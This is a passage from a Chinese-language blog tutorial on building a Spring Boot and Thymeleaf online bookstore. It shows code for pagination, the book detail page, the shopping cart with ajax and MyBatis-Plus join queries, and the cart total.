class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;inputPage&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;跳转指定页&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-info btn-search&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;goPage([[$&#123;pageSize&#125;]],[[$&#123;category&#125;]])&quot;</span>&gt;</span>GO<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>很简单，获取到inputPage表单提交的要跳转到的页后，直接loadData对应页</p><ul><li>控制每页显示几条数据</li></ul><p>在用select及option实现下拉选项的效果，定义value&#x3D;pagesize，实现回传，在option发生变化时(onchange)调用loadDataBysize(this)。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;pageSize&quot;</span> <span class="attr">th:value</span>=<span class="string">&quot;$&#123;pageSize&#125;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px;display: inline;&quot;</span> <span class="attr">th:onchange</span>=<span class="string">&quot;|loadDataBySize(this)|&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span> <span class="attr">th:selected</span>=<span class="string">&quot;$&#123;pageSize == 2&#125;&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span> <span class="attr">th:selected</span>=<span class="string">&quot;$&#123;pageSize == 4&#125;&quot;</span>&gt;</span>4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br></pre></td></tr></table></figure><p>this.value也就是选中的pagesize，然后调用load实现页面展示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#bookList&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/book/getBookListData&quot;</span>,<span class="title function_">queryData</span>(<span class="number">1</span>,obj.<span class="property">value</span>,category))</span><br></pre></td></tr></table></figure><h2 id="图书详情页展示"><a href="#图书详情页展示" class="headerlink" title="图书详情页展示"></a>图书详情页展示</h2><p>跳转到图书详情页，可以有两个位置：</p><p>一个是点击图片，一个是点下面的更多信息</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522165750775.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522165750775.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230522165750775"></p><p>在img标签前后加上&lt;a&gt;标签，超链接跳转至<code>th:href=&quot;@&#123;/book/detail(id=$&#123;book.id&#125;)</code>带上book.id，当作书的主键，根据id做详情页的展示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/detail&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getdetail</span><span class="params">(Integer id,Model model)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;details&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后做图书信息的查询，查询完成的内容写入model。跟图书展示类似。</p><blockquote><p>只不过图书展示是以category做分类进行查询的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">queryWrapper.eq(<span class="string">&quot;category&quot;</span>,category);</span><br></pre></td></tr></table></figure><p>根据category，用page进行分页，分完页在用getRecords()把数据写进model</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IPage&lt;Book&gt; iPage  = bookService.page(<span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(page,<span class="number">4</span>),queryWrapper);</span><br><span class="line">model.addAttribute(<span class="string">&quot;bookList&quot;</span>,iPage.getRecords());</span><br></pre></td></tr></table></figure></blockquote><p>这里用bookService.getById(id);进行查询，不用进行分页，能直接把整个查询到的book传给model进行展示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> bookService.getById(id);</span><br><span class="line">model.addAttribute(<span class="string">&quot;book&quot;</span>,book);</span><br></pre></td></tr></table></figure><p>前端用themleaf做渲染时，因为publishDate在数据库中是date类型，所以用dates.format做下格式化处理</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">th:text=&quot;$&#123;#dates.format(book.publishDate,&#x27;yyyy年MM月&#x27;)&#125;</span><br></pre></td></tr></table></figure><p>在详情页的位置，想在这里做一个相同分类图书的推荐</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522173323904.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522173323904.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230522173323904"></p><p>用bootstrap来居右：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-md-4 col-sm-3 col-xs-8&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里先写上静态的，时间不够了，后期有空再来改</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522193941557.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522193941557.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230522193941557"></p><p>商品详情用了一个折叠功能，<code>data-toggle=&quot;collapse&quot;</code>  属性指定了超链接的作用，表示这个链接可以展开或折叠内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">data-toggle</span>=<span class="string">&quot;collapse&quot;</span> <span class="attr">data-parent</span>=<span class="string">&quot;#accordion&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#collapseTwo&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522193930590.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522193930590.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230522193930590"></p><p>也是只是写了个静态（数据表都还没建。。）</p><h2 id="购物车"><a href="#购物车" class="headerlink" title="购物车"></a>购物车</h2><h3 id="加入购物车功能"><a href="#加入购物车功能" class="headerlink" title="加入购物车功能"></a>加入购物车功能</h3><p>点击加入购物车，执行addCart函数，只需要传递主键id</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;addCart([[$&#123;book.id&#125;]])&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-default&quot;</span> <span class="attr">role</span>=<span class="string">&quot;button&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>首先，需要判断用户名是否为空，没登录当然不能添加到购物车（session)。购买数量也不能为空</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> user = [[$&#123;session.<span class="property">user</span>&#125;]];</span><br><span class="line"><span class="keyword">var</span> bookNum = $(<span class="string">&quot;#bookCount&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">   <span class="keyword">if</span>(bookNum == <span class="string">&#x27;&#x27;</span> || bookNum == <span class="string">&#x27;undefined&#x27;</span>)&#123;</span><br><span class="line">       <span class="title function_">alert</span>(<span class="string">&quot;请输入购买数量！&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">if</span>(user == <span class="string">&#x27;&#x27;</span> || user == <span class="literal">null</span>)&#123;</span><br><span class="line">       <span class="title function_">alert</span>(<span class="string">&quot;请先登录！&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>使用ajax加入购物车，把接收到的bookid和购买数量count post给&#x2F;cart&#x2F;add映射</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">      <span class="attr">url</span>: contextPath + <span class="string">&quot;/cart/add&quot;</span>,</span><br><span class="line">      <span class="attr">data</span>:&#123;<span class="string">&#x27;count&#x27;</span> : bookNum,<span class="string">&#x27;bookId&#x27;</span> : bookId&#125;,</span><br><span class="line">      <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">      <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span>(data == <span class="string">&#x27;success&#x27;</span>)&#123;</span><br><span class="line">             <span class="comment">//跳转到购物车列表</span></span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = contextPath + <span class="string">&quot;/cart/list&quot;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">   &#125;)</span><br></pre></td></tr></table></figure><p>完整的代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> user = [[$&#123;session.<span class="property">user</span>&#125;]];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addCart</span>(<span class="params">bookId</span>) &#123;</span><br><span class="line">   <span class="comment">//验证购买图书数量</span></span><br><span class="line">   <span class="keyword">var</span> bookNum = $(<span class="string">&quot;#bookCount&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">   <span class="keyword">if</span>(bookNum == <span class="string">&#x27;&#x27;</span> || bookNum == <span class="string">&#x27;undefined&#x27;</span>)&#123;</span><br><span class="line">       <span class="title function_">alert</span>(<span class="string">&quot;请输入购买数量！&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//验证用户是否已经登录</span></span><br><span class="line">   <span class="keyword">if</span>(user == <span class="string">&#x27;&#x27;</span> || user == <span class="literal">null</span>)&#123;</span><br><span class="line">       <span class="title function_">alert</span>(<span class="string">&quot;请先登录！&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//加入购物车</span></span><br><span class="line">   $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">      <span class="attr">url</span>: contextPath + <span class="string">&quot;/cart/add&quot;</span>,</span><br><span class="line">      <span class="attr">data</span>:&#123;<span class="string">&#x27;count&#x27;</span> : bookNum,<span class="string">&#x27;bookId&#x27;</span> : bookId&#125;,</span><br><span class="line">      <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">      <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span>(data == <span class="string">&#x27;success&#x27;</span>)&#123;</span><br><span class="line">             <span class="comment">//跳转到购物车列表</span></span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = contextPath + <span class="string">&quot;/cart/list&quot;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">   &#125;)</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>后端，enums下建Cart的实体类，加@Data，@TableName，建CartMapper，建CartService不赘述了</p><p>注意这里定义实体类的名字和ajax post的json数据的key对应一下，这样在CartController就能直接用Cart来接收参数了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Integer bookid;</span><br><span class="line"><span class="keyword">private</span> Integer count;</span><br></pre></td></tr></table></figure><p>CartController直接用Cart来接收bookid和count参数，从session中取userid然后存进cart数据库</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">addCart</span><span class="params">(Cart cart，HttpSession session)</span>&#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        cart.setUserid(user.getId());</span><br><span class="line">    cartService.save(cart);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样四个字段都与bs_cart数据表对应上了：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522184040441.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522184040441.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230522184040441"></p><blockquote><ul><li>注意：addCart方法需要用ResponseBody进行注解，把返回内容直接写入到HTTP response</li></ul><p><code>@ResponseBody</code>  注解用于控制器方法上，表示该方法返回的是响应体（ResponseBody），而不是视图名。</p><p>通常情况下，控制器方法返回的是视图名，然后框架会使用该视图名去匹配视图并渲染，最终返回响应。  </p><p> 使用  <code>@ResponseBody</code>  注解后，方法返回的内容将直接写入到 HTTP 响应体中，而不是写入到模型和视图中。 </p></blockquote><ul><li>测试是否写入数据表bs_cart：</li></ul><p>未登录时会提示先登录：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522190110327.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522190110327.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230522190110327"></p><p>用godown买的，user_id&#x3D;6：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522192955454.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522192955454.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230522192955454"></p><p>但是这样写有个问题，每次都是save()保存一条新数据。</p><p>正确的逻辑应该是：如果user_id和book_id一样，就对count做加，如果不一样再写入一条新数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">add</span><span class="params">(Cart cart, HttpSession session)</span>&#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    cart.setUserId(user.getId());</span><br><span class="line">    <span class="comment">//判断是否已经在购物车存在该记录</span></span><br><span class="line">    QueryWrapper&lt;Cart&gt; cartQueryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">    cartQueryWrapper.eq(<span class="string">&quot;user_id&quot;</span>,user.getId());</span><br><span class="line">    cartQueryWrapper.eq(<span class="string">&quot;book_id&quot;</span>,cart.getBookId());</span><br><span class="line">    <span class="type">Cart</span> <span class="variable">queryCart</span> <span class="operator">=</span> cartService.getOne(cartQueryWrapper);</span><br><span class="line">    <span class="keyword">if</span>(queryCart == <span class="literal">null</span>)&#123;</span><br><span class="line">        cartService.save(cart);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        queryCart.setCount(queryCart.getCount() + cart.getCount());</span><br><span class="line">        cartService.updateById(queryCart);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过getOne查询是否有符合条件的数据，setCount更改count值，updateById更新至表</p><p>这样再添加一本，count就直接变为2：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522193659491.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522193659491.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230522193659491"></p><h3 id="购物车列表显示页面"><a href="#购物车列表显示页面" class="headerlink" title="购物车列表显示页面"></a>购物车列表显示页面</h3><ul><li>数据库关联</li></ul><p>加入到购物车只使用了book_id，但是购物车的信息展示一定需要用到图书名，价格等，所以需要做数据表的关联</p><p>在Cart实体类中，关联Book数据库：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Book book;</span><br></pre></td></tr></table></figure><p>如果只是像上面那样在Cart.java下定义一遍Book，在用mybatis-plus进行查询封装结果集的时候，会认为没有Book类的字段</p><p>这里用@TableField注解，表明Cart是不和Book数据库中的列进行映射的，只是作为结果集的存放</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//屏蔽数据库中该表和Book表的映射</span></span><br><span class="line"><span class="meta">@TableField(exist=false)</span></span><br><span class="line"><span class="keyword">private</span> Book book;</span><br></pre></td></tr></table></figure><p>这样就做好关联了</p><ul><li>查询当前用户购物车</li></ul><p>这种关联数据库的查询mybatis并没有提供对应的方法，只能手敲sql语句了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> bs_cart bsc <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> bs_book bsb <span class="keyword">ON</span> bsc.book_id <span class="operator">=</span> bsb.id;</span><br></pre></td></tr></table></figure><p>指定主表为bs_cart，并改别名为bsc。使用LEFT JOIN把主表(bs_cart)和bs_book连接，并用bsb作为表别名，连接条件是bs_cart.book_id&#x3D;bs_book.id</p><p>该句sql语句的作用为，查询bs_cart和bs_book按id关联起来的表的数据</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522200303848.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522200303848.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230522200303848"></p><p>加上限定<code>where user_id =</code>，起到查询用户购物车的作用</p><p>当然，*可以换掉，应为不是全部图书信息都要在购物车页面做展示，仅需要bs_book的book_name,imgUrl,newPrice和bs_cart全部信息</p><p>重新建一个实体类CartVo来储存关联后的数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CartVo</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> Integer userId;</span><br><span class="line">    <span class="keyword">private</span> Integer bookId;</span><br><span class="line">    <span class="keyword">private</span> Integer count;</span><br><span class="line">    <span class="keyword">private</span> String bookName;</span><br><span class="line">    <span class="keyword">private</span> String imgUrl;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> newPrice;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在CartMapper做关联查询的实现：</p><p>在mybatis中，只需要用@select()注解表明查询的sql语句，就能指明方法要执行的sql语句。用List&lt;CartVo&gt;来存储结果集</p><p>#{userId}变量，预编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;SELECT\n&quot; +</span></span><br><span class="line"><span class="meta">            &quot;\tbsc.*, bsb.NAME AS bookName, bsb.img_url AS img_url,\n&quot; +</span></span><br><span class="line"><span class="meta">            &quot;\tbsb.new_price AS new_price\n&quot; +</span></span><br><span class="line"><span class="meta">            &quot;FROM\n&quot; +</span></span><br><span class="line"><span class="meta">            &quot;\tbs_cart bsc\n&quot; +</span></span><br><span class="line"><span class="meta">            &quot;LEFT JOIN bs_book bsb ON bsc.book_id = bsb.id\n&quot; +</span></span><br><span class="line"><span class="meta">            &quot;WHERE\n&quot; +</span></span><br><span class="line"><span class="meta">            &quot;\tbsc.user_id = #&#123;userId&#125;&quot;)</span></span><br><span class="line">    List&lt;CartVo&gt; <span class="title function_">findCartListByUserId</span><span class="params">(Integer userId)</span>;</span><br></pre></td></tr></table></figure><p>写一个测试方法来测试一下：</p><p>在AnzfloorApplicationTest里新建一个测试，看下能否在项目中查询到关联后的数据，因为之前是用userid&#x3D;6添加的购物车，查询也用6</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> CartMapper cartMapper;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findCartList</span><span class="params">()</span> &#123;cartMapper.findCartListByUserId(<span class="number">6</span>).forEach(System.out::println);&#125;</span><br></pre></td></tr></table></figure><p>运行的很完美：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523110223352.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523110223352.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230523110223352"></p><p>Service层调用一遍mapper.findCartByUserId:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CartService</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;CartMapper, Cart&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> CartMapper cartMapper;</span><br><span class="line">    <span class="keyword">public</span> List&lt;CartVo&gt; <span class="title function_">findCartByUser</span><span class="params">(Integer userId)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cartMapper.findCartListByUserId(userId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Controller把查询出的数据封装进model</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;CartVo&gt; cartVos = cartService.findCartByUser(user.getId());</span><br><span class="line">model.addAttribute(<span class="string">&quot;cartList&quot;</span>,cartVos);</span><br></pre></td></tr></table></figure><p>测试：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523130516343.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523130516343.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230523130516343"></p><p>向购物车里新加一本不同的书：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523130551928.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523130551928.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230523130551928"></p><p>新加一本相同的书：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523130633873.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523130633873.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230523130633873"></p><h3 id="计算总金额"><a href="#计算总金额" class="headerlink" title="计算总金额"></a>计算总金额</h3><p>CartService下定义一个计算总金额的方法，逻辑很简单，书的金额乘以数量的总和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getCartItemTotal</span><span class="params">(List&lt;CartVo&gt; list)</span>&#123;</span><br><span class="line">    <span class="type">double</span> sum=<span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">for</span>(CartVo cart:list)&#123;</span><br><span class="line">        sum += cart.getCount() * cart.getNewPrice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用该方法然后写入到session</p><p>前端显示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;text-success cartPrice&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;session.userCartInfo.totalPrice&#125;&quot;</span>&gt;</span>345<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230529204707259.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230529204707259.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230529204707259"></p><ul><li>数量栏的实现：</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230529211316871.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230529211316871.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230529211316871"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&#x27;btn btn-default&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">th:onclick</span>=<span 